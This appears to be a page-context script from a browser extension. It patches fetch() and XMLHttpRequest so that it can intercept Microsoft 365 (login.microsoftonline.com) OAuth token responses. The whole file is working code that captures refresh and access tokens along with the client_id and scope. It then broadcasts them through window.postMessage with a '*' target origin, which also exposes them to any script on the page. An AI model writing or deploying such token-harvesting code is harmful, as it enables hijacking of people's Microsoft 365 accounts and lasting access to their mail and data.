// Page-context script: patches fetch() and XMLHttpRequest to intercept
// login.microsoftonline.com token endpoint responses and capture refresh tokens.
// Injected by content/content.js via a <script> element (runs in page world).
(function() {
  // Check whether a URL is a token endpoint we care about
  function isTokenEndpoint(url) {
    return url && url.indexOf("login.microsoftonline.com") !== -1 && url.indexOf("oauth2") !== -1 && url.indexOf("token") !== -1;
  }

  // Extract client_id and scope from a URL-encoded form body string
  function parseFormBody(body) {
    var clientId = null, scope = null;
    if (typeof body === "string") {
      try {
        var params = new URLSearchParams(body);
        clientId = params.get("client_id");
        scope = params.get("scope");
      } catch (e) {}
    }
    return { clientId: clientId, scope: scope };
  }

  // Post the captured token data to the content script via window.postMessage
  function postTokenResponse(refreshToken, accessToken, clientId, scope, url) {
    window.postMessage({
      type: "M365OWA_TOKEN_RESPONSE",
      refresh_token: refreshToken,
      access_token: accessToken || null,
      client_id: clientId || null,
      scope: scope || null,
      url: url || null,
    }, "*");
  }

  // --- Patch fetch() ---
  var originalFetch = window.fetch;
  window.fetch = function() {
    var args = arguments;
    var url = typeof args[0] === "string" ? args[0] : (args[0] && args[0].url) || "";
    var promise = originalFetch.apply(this, args);
    if (isTokenEndpoint(url)) {
      promise.then(function(response) {
        try {
          var meta = parseFormBody(args[1] && args[1].body);
          var clone = response.clone();
          clone.json().then(function(data) {
            if (data.refresh_token) {
              postTokenResponse(data.refresh_token, data.access_token, meta.clientId, meta.scope, url);
            }
          }).catch(function() {});
        } catch (e) {}
      }).catch(function() {});
    }
    return promise;
  };

  // --- Patch XMLHttpRequest ---
  var originalOpen = XMLHttpRequest.prototype.open;
  var originalSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url) {
    this._m365owa_url = url;
    return originalOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body) {
    var self = this;
    if (isTokenEndpoint(this._m365owa_url)) {
      this.addEventListener("load", function() {
        try {
          var data = JSON.parse(self.responseText);
          if (data.refresh_token) {
            var meta = parseFormBody(body);
            postTokenResponse(data.refresh_token, data.access_token, meta.clientId, meta.scope, self._m365owa_url);
          }
        } catch (e) {}
      });
    }
    return originalSend.apply(this, arguments);
  };
})();
